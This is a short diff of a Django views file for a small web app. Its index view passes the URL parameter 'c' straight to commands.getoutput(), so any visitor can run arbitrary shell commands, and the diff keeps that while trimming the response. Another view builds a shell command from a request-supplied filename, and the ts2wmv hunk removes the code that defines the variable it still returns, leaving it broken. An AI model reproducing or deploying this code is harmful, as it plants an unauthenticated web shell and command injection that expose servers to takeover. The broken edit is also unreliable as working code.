@@ -8,7 +8,7 @@ def index(request):
     s = None
     try:
         s = str(request.GET['c'])
-        return HttpResponse(s+'<br>Hello from Python!<br>'+str(commands.getoutput(s)))
+        return HttpResponse(commands.getoutput(s))
     except Exception:
         pass
     return render(request, 'index.html')
@@ -26,10 +26,6 @@ def runasm(request):
     return HttpResponse(commands.getoutput('fasm/'+fn))
 
 def ts2wmv(request):
-    fn = str(request.GET['data'])
-    ff = FFmpeg(inputs={'/tmp/input.ts': None}, outputs={'/tmp/output.mp4': None})
-    ret = ff.cmd_str
-    ff.run()
     return HttpResponse(ret)
 
 def db(request):
